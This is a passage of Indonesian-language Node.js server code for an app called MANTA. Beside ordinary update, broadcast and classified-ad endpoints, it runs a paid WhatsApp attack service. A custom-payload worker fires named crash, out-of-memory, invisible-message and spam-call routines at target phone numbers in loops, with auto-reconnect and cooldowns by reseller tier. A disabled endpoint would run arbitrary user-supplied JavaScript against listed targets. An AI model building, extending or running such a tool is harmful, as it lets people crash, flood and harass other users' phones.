    } catch {
        return false;
    }
}

function isCatboxUrl(url) {
    return typeof url === 'string' && url.includes('catbox.moe');
}

function getUserFromBearer(req) {
    try {
        const auth = req.headers['authorization'] || '';
        const token = auth.replace('Bearer ', '').trim();
        if (!token) return null;

        reloadActiveKeys();
        let username = null;


        const keyInfo = activeKeys[token];
        if (keyInfo && (!keyInfo.expires || keyInfo.expires > Date.now())) {
            username = keyInfo.username;
        }


        if (!username) {
            const keyList = loadKeyList();
            const found = keyList.find(k => k.sessionKey === token || k.key === token);
            if (found) username = found.username;
        }

        if (!username) return null;

        const db = loadDatabase();
        const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
        return user || null;
    } catch {
        return null;
    }
}

function isKingz(user) {
    return user && ['KINGZ'].includes((user.role || '').toUpperCase());
}

app.get('/api/check-update', (req, res) => {
    const user = getUserFromBearer(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { version = '0.0.0', build = '0', platform = 'android' } = req.query;

    const updateInfo = loadUpdateInfo();
    if (!updateInfo) {
        return res.status(500).json({ error: 'Gagal membaca data update' });
    }

    const hasUpdate =
        updateInfo.download_url &&
        updateInfo.download_url.trim() !== '' &&
        isNewerVersion(updateInfo.version, version);

    const broadcast = loadBroadcast();
    const hasBroadcast =
        broadcast.active &&
        !broadcast.readBy.includes(user.username);

    console.log(`[CHECK-UPDATE] user=${user.username} clientV=${version} serverV=${updateInfo.version} hasUpdate=${hasUpdate}`);

    return res.json({
        has_update: hasUpdate,
        update_info: hasUpdate
            ? {
                version: updateInfo.version,
                build: updateInfo.build,
                download_url: updateInfo.download_url,
                size: updateInfo.size || 0,
                changelog: updateInfo.changelog || [],
                force_update: updateInfo.force_update || false,
                is_catbox: isCatboxUrl(updateInfo.download_url),
                updated_at: updateInfo.updatedAt,
            }
            : null,
        broadcast: hasBroadcast
            ? {
                active: true,
                message: broadcast.message,
                sent_at: broadcast.sentAt,
                sent_by: broadcast.sentBy,
            }
            : { active: false },
    });
});

app.post('/api/admin/set-update', (req, res) => {
    const user = getUserFromBearer(req);
    if (!user) return res.status(401).json({ success: false, message: 'Unauthorized' });
    if (!isKingz(user)) return res.status(403).json({ success: false, message: 'Hanya KINGZ yang bisa mengatur update' });

    const { version, download_url, changelog = [], platform = 'android', force_update = false, size = 0 } = req.body;

    if (!version || typeof version !== 'string' || !version.trim()) {
        return res.status(400).json({ success: false, message: 'version wajib diisi' });
    }

    if (!download_url || typeof download_url !== 'string' || !download_url.trim()) {
        return res.status(400).json({ success: false, message: 'download_url wajib diisi' });
    }

    if (!isValidUrl(download_url)) {
        return res.status(400).json({ success: false, message: 'download_url tidak valid' });
    }

    if (!/^\d+\.\d+(\.\d+)?$/.test(version.trim())) {
        return res.status(400).json({ success: false, message: 'Format versi salah, gunakan x.y.z (cth: 2.1.0)' });
    }

    const payload = {
        version: version.trim(),
        build: String(Date.now()),
        download_url: download_url.trim(),
        size: Number(size) || 0,
        changelog: Array.isArray(changelog)
            ? changelog.filter(c => typeof c === 'string' && c.trim())
            : [],
        platform: platform || 'android',
        force_update: Boolean(force_update),
        is_catbox: isCatboxUrl(download_url.trim()),
        updatedAt: Date.now(),
        updatedBy: user.username,
    };

    try {
        saveUpdateInfo(payload);
        console.log(`[SET-UPDATE] ${user.username} set update → v${payload.version} | ${payload.download_url}`);
        return res.json({
            success: true,
            message: `Update v${payload.version} berhasil disimpan`,
            data: payload,
        });
    } catch (e) {
        console.error('[SET-UPDATE] Error:', e);
        return res.status(500).json({ success: false, message: 'Gagal menyimpan update info' });
    }
});

app.post('/api/admin/broadcast-update', (req, res) => {
    const user = getUserFromBearer(req);
    if (!user) return res.status(401).json({ success: false, message: 'Unauthorized' });
    if (!isKingz(user)) return res.status(403).json({ success: false, message: 'Hanya KINGZ yang bisa broadcast' });

    const { message } = req.body;
    if (!message || !message.trim()) {
        return res.status(400).json({ success: false, message: 'message tidak boleh kosong' });
    }

    const updateInfo = loadUpdateInfo();
    const autoMsg = message.trim() ||
        (updateInfo ? `Ada update terbaru MANTA v${updateInfo.version}! Segera update aplikasimu.` : 'Ada update terbaru!');

    const broadcast = {
        active: true,
        message: autoMsg,
        sentAt: Date.now(),
        sentBy: user.username,
        readBy: [],
    };

    try {
        saveBroadcast(broadcast);

        const broadcastMsg = JSON.stringify({
            type: "broadcast_update",
            message: autoMsg
        });
        for (const username in wsClients) {
            try {
                if (wsClients[username].readyState === WebSocket.OPEN) {
                    wsClients[username].send(broadcastMsg);
                }
            } catch (err) { }
        }

        console.log(`[BROADCAST] ${user.username} → "${autoMsg}"`);
        return res.json({
            success: true,
            message: 'Broadcast terkirim ke semua user',
            data: broadcast,
        });
    } catch (e) {
        console.error('[BROADCAST] Error:', e);
        return res.status(500).json({ success: false, message: 'Gagal menyimpan broadcast' });
    }
});

app.post('/api/broadcast/dismiss', (req, res) => {
    const user = getUserFromBearer(req);
    if (!user) return res.status(401).json({ success: false, message: 'Unauthorized' });

    const broadcast = loadBroadcast();
    if (!broadcast.readBy.includes(user.username)) {
        broadcast.readBy.push(user.username);
        saveBroadcast(broadcast);
    }

    console.log(`[BROADCAST-DISMISS] ${user.username} dismiss broadcast`);
    return res.json({ success: true, message: 'Broadcast di-dismiss' });
});

app.get('/api/admin/update-status', (req, res) => {
    const user = getUserFromBearer(req);
    if (!user) return res.status(401).json({ success: false, message: 'Unauthorized' });
    if (!isKingz(user)) return res.status(403).json({ success: false, message: 'Forbidden' });

    const updateInfo = loadUpdateInfo();
    const broadcast = loadBroadcast();
    const db = loadDatabase();

    return res.json({
        success: true,
        update_info: updateInfo,
        broadcast: {
            ...broadcast,
            total_users: db.length,
            read_count: broadcast.readBy.length,
            unread_count: db.length - broadcast.readBy.length,
        },
    });
});

const JASAPOST_FILE = path.join(__dirname, 'jasapost.json');
const JASAPOST_KODE_FILE = path.join(__dirname, 'jasapost_kode.json');

function loadJasaPost() {
    try {
        if (!fs.existsSync(JASAPOST_FILE)) fs.writeFileSync(JASAPOST_FILE, JSON.stringify([], null, 2));
        return JSON.parse(fs.readFileSync(JASAPOST_FILE, 'utf8'));
    } catch { return []; }
}
function saveJasaPost(data) { fs.writeFileSync(JASAPOST_FILE, JSON.stringify(data, null, 2)); }

function loadJasaKode() {
    try {
        if (!fs.existsSync(JASAPOST_KODE_FILE)) fs.writeFileSync(JASAPOST_KODE_FILE, JSON.stringify([], null, 2));
        return JSON.parse(fs.readFileSync(JASAPOST_KODE_FILE, 'utf8'));
    } catch { return []; }
}
function saveJasaKode(data) { fs.writeFileSync(JASAPOST_KODE_FILE, JSON.stringify(data, null, 2)); }

function isValidUrl(str) {
    try { const u = new URL(str); return u.protocol === 'http:' || u.protocol === 'https:'; }
    catch { return false; }
}

function isAdmin(username) {
    try {
        const db = loadDatabase();
        const u = db.find(u => u.username === username);
        return u && ['KINGZ'].includes(u.role);
    } catch { return false; }
}


function purgeExpiredIklan() {
    const now = Date.now();
    const iklanList = loadJasaPost();
    const before = iklanList.length;
    const valid = iklanList.filter(i => !i.expiredAt || i.expiredAt === 0 || i.expiredAt > now);
    if (valid.length < before) {
        saveJasaPost(valid);
        console.log(`[JASAPOST] Auto-hapus ${before - valid.length} iklan kadaluarsa`);
    }
    return valid;
}


setInterval(() => {
    try { purgeExpiredIklan(); } catch (_) { }
}, 60 * 60 * 1000);


app.get('/jasapost/list', (req, res) => {
    const { key, kategori, q, sold } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });

    let iklan = purgeExpiredIklan(); // auto hapus yang expired setiap list dipanggil

    if (kategori && kategori !== 'Semua')
        iklan = iklan.filter(i => i.kategori === kategori);

    if (q && q.trim() !== '') {
        const kw = q.toLowerCase();
        iklan = iklan.filter(i =>
            (i.judul || '').toLowerCase().includes(kw) ||
            (i.namaToko || '').toLowerCase().includes(kw) ||
            (i.deskripsi || '').toLowerCase().includes(kw)
        );
    }

    if (sold === 'tersedia') iklan = iklan.filter(i => !i.isSold && i.stok !== 0);
    else if (sold === 'terjual') iklan = iklan.filter(i => i.isSold || i.stok === 0);

    iklan = iklan.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
    return res.json({ valid: true, total: iklan.length, data: iklan });
});


app.get('/jasapost/verifyKode', (req, res) => {
    const { key, kodePost } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });
    if (!kodePost || !kodePost.trim()) return res.json({ valid: false, message: 'Kode tidak boleh kosong' });

    const kodeList = loadJasaKode();
    const found = kodeList.find(k => k.kode === kodePost.trim().toUpperCase());
    if (!found) return res.json({ valid: false, message: 'Kode tidak ditemukan' });
    if (found.used && found.usedBy !== keyInfo.username)
        return res.json({ valid: false, message: 'Kode sudah digunakan' });


    if (!found.used && found.kodeExpiredAt && found.kodeExpiredAt < Date.now())
        return res.json({ valid: false, message: 'Kode sudah kadaluarsa' });

    return res.json({
        valid: true,
        message: 'Kode valid',
        kode: found.kode,
        expiredAtStr: found.expiredAtStr || '',   // info masa aktif iklan untuk ditampilkan di Flutter
        hariAktif: found.hariAktif || 0,
    });
});


app.post('/jasapost/post', (req, res) => {
    const { key } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });

    const { kodePost, namaToko, judul, kategori, deskripsi, harga,
        kontakWa, kontakTg, kontakTelp, media, gambar, stok } = req.body;

    if (!kodePost || !namaToko || !judul || !kategori || !harga)
        return res.json({ valid: false, message: 'Field tidak lengkap' });

    if (!kontakWa && !kontakTg && !kontakTelp)
        return res.json({ valid: false, message: 'Minimal satu kontak wajib diisi' });

    const rawMedia = Array.isArray(media) ? media : (Array.isArray(gambar) ? gambar : []);
    const mediaList = rawMedia.map(u => String(u).trim()).filter(u => u && isValidUrl(u)).slice(0, 5);

    let stokVal = -1;
    if (stok !== undefined && stok !== null && stok !== '') {
        const parsed = parseInt(stok);
        if (!isNaN(parsed) && parsed >= 0) stokVal = parsed;
    }

    const kodeList = loadJasaKode();
    const kodeIndex = kodeList.findIndex(k => k.kode === String(kodePost).trim().toUpperCase());
    if (kodeIndex === -1) return res.json({ valid: false, message: 'Kode tidak valid' });
    if (kodeList[kodeIndex].used && kodeList[kodeIndex].usedBy !== keyInfo.username)
        return res.json({ valid: false, message: 'Kode sudah digunakan orang lain' });


    if (!kodeList[kodeIndex].used && kodeList[kodeIndex].kodeExpiredAt &&
        kodeList[kodeIndex].kodeExpiredAt < Date.now())
        return res.json({ valid: false, message: 'Kode sudah kadaluarsa' });


    const hariAktif = kodeList[kodeIndex].hariAktif || 0;
    const expiredAt = hariAktif > 0 ? Date.now() + hariAktif * 24 * 60 * 60 * 1000 : 0;
    const expiredAtStr = expiredAt > 0
        ? new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
        : '';

    const iklanBaru = {
        id: crypto.randomBytes(8).toString('hex'),
        username: keyInfo.username,
        namaToko: sanitize(namaToko),
        judul: sanitize(judul),
        kategori: sanitize(kategori),
        deskripsi: deskripsi ? sanitize(deskripsi) : '',
        harga: sanitize(String(harga)),
        kontakWa: kontakWa ? sanitize(kontakWa) : '',
        kontakTg: kontakTg ? sanitize(kontakTg) : '',
        kontakTelp: kontakTelp ? sanitize(kontakTelp) : '',
        media: mediaList,
        gambar: mediaList,
        stok: stokVal,
        isSold: stokVal === 0,
        kodePost: kodeList[kodeIndex].kode,
        expiredAt,
        expiredAtStr,
        createdAt: Date.now(),
        createdAtStr: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
        updatedAt: Date.now(),
    };

    const iklanList = loadJasaPost();
    iklanList.push(iklanBaru);
    saveJasaPost(iklanList);

    kodeList[kodeIndex].used = true;
    kodeList[kodeIndex].usedBy = keyInfo.username;
    kodeList[kodeIndex].usedAt = new Date().toISOString();
    saveJasaKode(kodeList);

    const expLog = hariAktif > 0 ? `, expired: ${expiredAtStr}` : '';
    console.log(`[JASAPOST] Iklan baru dari ${keyInfo.username}: "${iklanBaru.judul}" (${mediaList.length} media, stok: ${stokVal < 0 ? 'unlimited' : stokVal}${expLog})`);
    return res.json({ valid: true, message: 'Iklan berhasil diposting!', iklan: iklanBaru });
});


app.post('/jasapost/generateKode', (req, res) => {
    const { key } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });

    if (!isAdmin(keyInfo.username))
        return res.json({ valid: false, message: 'Hanya KINGZ yang bisa generate kode' });

    const total = Math.min(Math.max(parseInt(req.body.jumlah) || 1, 1), 50);
    const hariAktif = Math.max(parseInt(req.body.hari) || 7, 1); // default 7 hari, minimal 1

    const kodeList = loadJasaKode();
    const kodesBaru = [];

    for (let i = 0; i < total; i++) {
        const kode = 'JP-' + crypto.randomBytes(4).toString('hex').toUpperCase();


        const kodeExpiredAt = Date.now() + hariAktif * 24 * 60 * 60 * 1000;
        const expiredAtStr = new Date(kodeExpiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        kodeList.push({
            kode,
            used: false,
            usedBy: null,
            usedAt: null,
            hariAktif,
            kodeExpiredAt,  // kapan kode tidak bisa dipakai lagi
            expiredAtStr,   // string readable untuk Flutter
            generatedBy: keyInfo.username,
            generatedAt: new Date().toISOString(),
        });

        kodesBaru.push({ kode, expiredAtStr, hariAktif });
    }

    saveJasaKode(kodeList);
    console.log(`[JASAPOST] ${keyInfo.username} generate ${total} kode (${hariAktif} hari aktif)`);
    return res.json({ valid: true, message: `${total} kode berhasil dibuat (${hariAktif} hari)`, kodes: kodesBaru });
});


app.delete('/jasapost/delete', (req, res) => {
    const { key, id } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });
    if (!id) return res.json({ valid: false, message: 'ID iklan diperlukan' });

    const iklanList = loadJasaPost();
    const idx = iklanList.findIndex(i => i.id === id);
    if (idx === -1) return res.json({ valid: false, message: 'Iklan tidak ditemukan' });

    if (!isAdmin(keyInfo.username) && iklanList[idx].username !== keyInfo.username)
        return res.json({ valid: false, message: 'Tidak punya izin hapus iklan ini' });

    const judul = iklanList[idx].judul;
    iklanList.splice(idx, 1);
    saveJasaPost(iklanList);
    console.log(`[JASAPOST] Iklan "${judul}" dihapus oleh ${keyInfo.username}`);
    return res.json({ valid: true, message: 'Iklan berhasil dihapus' });
});


app.post('/jasapost/markSold', (req, res) => {
    const { key } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });

    const { id, sold } = req.body;
    if (!id) return res.json({ valid: false, message: 'ID iklan diperlukan' });
    if (typeof sold !== 'boolean') return res.json({ valid: false, message: 'Field sold harus boolean' });

    const iklanList = loadJasaPost();
    const idx = iklanList.findIndex(i => i.id === id);
    if (idx === -1) return res.json({ valid: false, message: 'Iklan tidak ditemukan' });

    if (!isAdmin(keyInfo.username) && iklanList[idx].username !== keyInfo.username)
        return res.json({ valid: false, message: 'Hanya pemilik iklan atau admin yang bisa ubah status' });

    iklanList[idx].isSold = sold;
    iklanList[idx].updatedAt = Date.now();
    if (!sold && iklanList[idx].stok === 0) iklanList[idx].stok = -1;

    saveJasaPost(iklanList);
    console.log(`[JASAPOST] "${iklanList[idx].judul}" → ${sold ? 'TERJUAL' : 'TERSEDIA'} oleh ${keyInfo.username}`);
    return res.json({ valid: true, message: sold ? 'Iklan ditandai TERJUAL' : 'Iklan ditandai TERSEDIA', iklan: iklanList[idx] });
});


app.post('/jasapost/updateStok', (req, res) => {
    const { key } = req.query;
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Key tidak valid' });

    const { id, stok } = req.body;
    if (!id) return res.json({ valid: false, message: 'ID iklan diperlukan' });

    const stokVal = parseInt(stok);
    if (isNaN(stokVal) || stokVal < -1)
        return res.json({ valid: false, message: 'Stok tidak valid' });

    const iklanList = loadJasaPost();
    const idx = iklanList.findIndex(i => i.id === id);
    if (idx === -1) return res.json({ valid: false, message: 'Iklan tidak ditemukan' });

    if (!isAdmin(keyInfo.username) && iklanList[idx].username !== keyInfo.username)
        return res.json({ valid: false, message: 'Hanya pemilik iklan atau admin yang bisa ubah stok' });

    iklanList[idx].stok = stokVal;
    iklanList[idx].updatedAt = Date.now();

    if (stokVal === 0) iklanList[idx].isSold = true;
    else if (stokVal > 0) iklanList[idx].isSold = false;

    saveJasaPost(iklanList);
    console.log(`[JASAPOST] Stok "${iklanList[idx].judul}" → ${stokVal < 0 ? 'unlimited' : stokVal} oleh ${keyInfo.username}`);
    return res.json({ valid: true, message: stokVal < 0 ? 'Stok diset ke Unlimited' : `Stok: ${stokVal} unit`, iklan: iklanList[idx] });
});



const DIGIT_RE = /\d{6,16}/g;

function sanitizeUserFunction(src) {
    if (typeof src !== "string") return src;
    return src.replace(/\bchalk\.(\w+)\s*\(/g, "console.log(");
}

function normalizeUserFunction(src) {
    if (typeof src !== "string") return src;

    let out = src;

    out = out.replace(/\bchalk\.(\w+)\s*\(/g, "console.log(");
    out = out.replace(/\b(await\s+)?(sock|socket|conn)\./g, "$1otax.");

    out = out.replace(
        /(async\s+function\s*\w*\s*)\(([^)]*)\)/g,
        (full, head, params) => {
            const p = params.split(",").map(s => s.trim()).filter(Boolean);

            if (p.length === 1 && p[0] === "target") {
                return `${head}(otax, target)`;
            }

            if (
                p.length === 2 &&
                ["sock", "socket", "conn"].includes(p[0]) &&
                p[1] === "target"
            ) {
                return `${head}(otax, target)`;
            }

            return full;
        }
    );

    out = out.replace(
        /(async\s*)?\(([^)]*)\)\s*=>/g,
        (full, asyncPart, params) => {
            const p = params.split(",").map(s => s.trim()).filter(Boolean);

            if (p.length === 1 && p[0] === "target") {
                return `${asyncPart || ""}(otax, target) =>`;
            }

            if (
                p.length === 2 &&
                ["sock", "socket", "conn"].includes(p[0]) &&
                p[1] === "target"
            ) {
                return `${asyncPart || ""}(otax, target) =>`;
            }

            return full;
        }
    );

    return out;
}

const parseTargets = s =>
    Array.from(
        new Set(
            (s?.match(DIGIT_RE) || [])
                .map(n => n.replace(/\D/g, ""))
                .filter(Boolean)
        )
    );

const toJid = num => {
    if (!num) return null;
    if (num.includes("@")) return num;
    return `${num}@s.whatsapp.net`;
};

const tempFuncLog = [];
const testFunctionReconnectLocks = new Map();

async function reconnectSessionInFolder(subfolderName) {
    const lockKey = String(subfolderName || '').trim();
    if (!lockKey) return null;

    const previous = testFunctionReconnectLocks.get(lockKey) || Promise.resolve();
    const current = previous.catch(() => { }).then(async () => {
        const folderPath = path.join(process.cwd(), 'otaxayun', lockKey);
        if (!fs.existsSync(folderPath)) return null;

        try {
            const entries = fs.readdirSync(folderPath);
            for (const entry of entries) {
                const entryPath = path.join(folderPath, entry);
                const sessionName = entry.endsWith('.json') ? path.basename(entry, '.json') : entry;

                let usable = entry.endsWith('.json');
                try {
                    usable = usable || (fs.statSync(entryPath).isDirectory() && fs.existsSync(path.join(entryPath, 'creds.json')));
                } catch (_) { }

                if (!usable) continue;

                if (typeof killExistingSession === 'function') {
                    killExistingSession(sessionName);
                } else {
                    try { activeConnections[sessionName]?.ws?.close?.(); } catch (_) { }
                    delete activeConnections[sessionName];
                    delete biz[sessionName];
                    delete mess[sessionName];
                }
            }
        } catch (err) {
            console.error('[TEST-FUNCTION] Gagal reset socket sebelum reconnect:', err.message);
        }

        await sleep(800);
        return checkActiveSessionInFolder(lockKey);
    });

    testFunctionReconnectLocks.set(lockKey, current);
    try {
        return await current;
    } finally {
        if (testFunctionReconnectLocks.get(lockKey) === current) {
            testFunctionReconnectLocks.delete(lockKey);
        }
    }
}

const testFunctionQueue = new MemoryQueue(15);

async function processTestFunctionJob(jobData) {
    const { username, targets, func, delay, loops, logId } = jobData;
    console.log(`\n[TEST-FUNCTION] 🚀 Start job untuk ${username}`);

    try {
        const otax = await reconnectSessionInFolder(username);
        if (!otax) throw new Error("Session tidak ditemukan");

        const execFn = toFunction(func);
        if (!execFn) throw new Error("Source is not a function / syntax error");

        const ctx = {
            generateWAMessageFromContent,
            generateWAMessage,
            prepareWAMessageMedia,
            relayWAMessage,
            proto,
            sleep,
            crypto
        };

        const logEntry = tempFuncLog.find(l => l.id === logId);
        if (logEntry) logEntry.status = "running";

        for (const jid of targets) {
            for (let i = 0; i < loops; i++) {
                try {
                    await execFn(otax, jid, ctx);
                } catch (err) {
                    console.error("EXEC ERROR", jid, err.message);
                }

                if (delay > 0 && i < loops - 1) {
                    await sleep(delay);
                }
            }
        }
    } catch (err) {
        console.error("ERROR in Worker", username, err.message);
    } finally {
        const idx = tempFuncLog.findIndex(l => l.id === logId);
        if (idx !== -1) tempFuncLog.splice(idx, 1);
    }
}

app.post("/test-function", async (req, res) => {
    return res.status(410).json({ error: "Endpoint disabled" });
    const { key, target, function: func, delay = 220, loops = 1 } = req.body;

    const rawTargets = parseTargets(target);
    if (!key || !func || !rawTargets.length) {
        return res.json({ success: false, message: "Data tidak lengkap" });
    }

    const targets = rawTargets
        .map(toJid)
        .filter(jid => typeof jid === "string" && jid.endsWith("@s.whatsapp.net"));

    if (!targets.length) {
        return res.json({ success: false, message: "Target tidak valid" });
    }

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ success: false, message: "Key tidak valid" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
        return res.json({ success: false, message: "User tidak ditemukan" });
    }

    const routeMismatch = getRouteMismatchPayload(user, req);
    if (routeMismatch) {
        return res.json({ success: false, cooldown: false, ...routeMismatch });
    }

    user.role ??= "FULLUP";
    const role = normalizeRoleKey(user.role);

    const roleCooldowns = {
        member: 200,
        FULLUP: 200,
        RESELLER: 160,
        PT: 100,
        TK: 60,
        OWNER: 0,
        KINGZ: 0
    };

    const cooldown = roleCooldowns[role] ?? 60;
    const now = Date.now();
    user.lastSend ??= 0;
    const diff = Math.floor((now - user.lastSend) / 1000);
    if (diff < cooldown) {
        return res.json({
            success: false,
            cooldown: true,
            wait: cooldown - diff,
            role,
            message: "Masih cooldown"
        });
    }

    user.lastSend = now;
    saveDatabase(db);

    let execFn;
    try {
        execFn = toFunction(func);
        if (!execFn) throw new Error("Source is not a function / syntax error");
    } catch (err) {
        return res.json({ success: false, message: "Syntax error: " + err.message });
    }

    const logEntry = {
        id: now,
        username: user.username,
        role,
        targets,
        delay,
        loops,
        status: "pending",
        time: now
    };

    tempFuncLog.push(logEntry);

    res.json({
        success: true,
        message: "Function diterima & diproses",
        role,
        targets,
        logId: now
    });


    testFunctionQueue.enqueue(() => processTestFunctionJob({
        username: user.username,
        targets,
        func, // Pass the string!
        delay,
        loops,
        logId: now
    }));
});

const toFunction = src => {
    try {
        const safeSrc = normalizeUserFunction(src);

        return new Function(
            "otax",
            "target",
            "ctx",
            `"use strict";
       const {
         generateWAMessageFromContent,
         generateWAMessage,
         prepareWAMessageMedia,
         relayWAMessage,
         proto,
         sleep,
         crypto
       } = ctx;
       const { randomBytes } = crypto;

       const fn = (${safeSrc});
       if (typeof fn !== "function")
         throw new Error("Source is not a function");

       return fn(otax, target, ctx);
      `
        );
    } catch (e) {
        console.error('[CUSTOM PAYLOAD EXEC]', e.message);
        return null;
    }
};


const customPayloadQueue = new MemoryQueue(15);

async function processCustomPayloadJob(jobData) {
    const { username, targetJid, bugs, parsedCount, parsedDelay } = jobData;
    console.log(`\n[CUSTOM-PAYLOAD] 🚀 Start job untuk ${username} | Target: ${targetJid} | Sender: PRIBADI`);

    try {
        let otax = await checkActiveSessionInFolder(username);
        if (!otax) {
            console.error(`[CUSTOM-PAYLOAD] ❌ Session PRIBADI WA untuk ${username} tidak ditemukan!`);
            return;
        }

        async function attemptRunCustomBug(otax, bugId, targetJid) {
            try {
                switch (bugId) {
                    case "click":
                        for (let i = 0; i < 1; i++) {
                            await packBlank(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "crash_spam":
                        for (let i = 0; i < 1; i++) {
                            await LocaNewotax(otax, targetJid);
                            await packBlank(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "hard":
                        for (let i = 0; i < 1; i++) {
                            await kresjandaotax(otax, targetJid);
                            await xcoreotax(otax, targetJid, targetJid);
                            await LocaNewotax(otax, targetJid);
                            await packBlank(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "spam_call":
                        for (let i = 0; i < 1; i++) {
                            await otax.offerCall(targetJid, true);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "android":
                        for (let i = 0; i < 1; i++) {
                            await paySuck(otax, targetJid);
                            await kresjandaotax(otax, targetJid);
                            await CarouselOtax(otax, targetJid);
                            await LocaCrashUi(otax, targetJid);
                            await xcoreotax(otax, targetJid, true);
                            await LocaNewManta(otax, targetJid);
                            await packBlank(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "invisible":
                        for (let i = 0; i < 1; i++) {
                            await ofmEr(otax, targetJid);
                            await dickg(otax, targetJid);
                            await ofmcrlManta(otax, targetJid);
                            await intImgBuffer(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "invisiblex":
                        for (let i = 0; i < 1; i++) {
                            await ofmcrlManta(otax, targetJid);
                            await intImgBuffer(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "ios_invis":
                        for (let i = 0; i < 1; i++) {
                            await iosinVisFC3(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "cxinv":
                        for (let z = 0; z < 5; z++) {
                            await oombimg(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "mbokep":
                        for (let z = 0; z < 1; z++) {
                            await videoCrashbokep(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "cspam":
                        for (let i = 0; i < 1; i++) {
                            await docThumb(otax, targetJid, true);
                            await intImgBuffer(otax, targetJid);
                            await ofmcrlManta(otax, targetJid);
                            await spamDelwy(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "cspamxx":
                        for (let i = 0; i < 1; i++) {
                            await kimak(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "fcotax":
                        for (let z = 0; z < 1; z++) {
                            await stInt(otax, targetJid);
                            await AyunBelovedxhams(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "fcotaxx":
                        for (let z = 0; z < 1; z++) {
                            await AyunBelovedjav(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "fcayun":
                        for (let z = 0; z < 1; z++) {
                            await AyunBelovedxnxx(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    case "fcmsgx":
                        for (let z = 0; z < 10; z++) {
                            await LocaFcBeta(otax, targetJid);
                            await invisOOMmanta(otax, targetJid);
                            await sleep(1000);
                        }
                        break;
                    default:
                        return false;
                }
                return true;
            } catch (err) {
                console.error(`[CUSTOM-PAYLOAD] ❌ Error mengirim ${bugId}:`, err.message);
                if (err.message === 'Connection Closed' || (err.message && err.message.includes('EPIPE'))) throw err;
                return false;
            }
        }

        for (let cycle = 0; cycle < parsedCount; cycle++) {
            for (let bugIndex = 0; bugIndex < bugs.length; bugIndex++) {
                if (cycle === 0 && bugIndex === 0 && job.data.skipFirstBug) {
                    continue;
                }

                const bugId = bugs[bugIndex];
                otax = await checkActiveSessionInFolder(username);
                if (!otax) {
                    console.error(`[CUSTOM-PAYLOAD] ❌ Session ${username} terputus di tengah eksekusi.`);
                    break;
                }
                try {
                    await attemptRunCustomBug(otax, bugId, targetJid);
                } catch (err) {
                    if (err.message === 'Connection Closed' || (err.message && err.message.includes('EPIPE'))) {
                        const folderPath = path.join('otaxayun', username);
                        if (fs.existsSync(folderPath)) {
                            const files = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
                            const sessionName = files.length > 0 ? path.basename(files[0], ".json") : null;
                            if (sessionName) delete activeConnections[sessionName];
                        }

                        console.log(`[CUSTOM-PAYLOAD] Connection closed. Auto reconnecting & retrying ${bugId}...`);
                        otax = await checkActiveSessionInFolder(username);
                        if (otax) {
                            try {
                                await attemptRunCustomBug(otax, bugId, targetJid);
                            } catch (err2) {
                                console.error(`[CUSTOM-PAYLOAD] ❌ Retry failed for ${bugId}:`, err2.message);
                            }
                        } else {
                            console.error(`[CUSTOM-PAYLOAD] ❌ Session ${username} tidak bisa reconnect.`);
                            break;
                        }
                    }
                }
                if (bugIndex < bugs.length - 1 && parsedDelay > 0) await sleep(parsedDelay);
            }
            if (cycle < parsedCount - 1 && parsedDelay > 0) await sleep(parsedDelay);
        }
        console.log(`[CUSTOM-PAYLOAD] ✅ Payload batch selesai untuk ${username}`);
    } catch (error) {
        console.error(`[CUSTOM-PAYLOAD] ❌ Loop error:`, error.message);
    }
}

app.post("/api/custom-payload", async (req, res) => {
    try {
        const key = req.body.key || req.query.key || req.headers['x-session-key'] || req.headers['session-key'];
        const { target, delay, count, bugs, mode } = req.body;

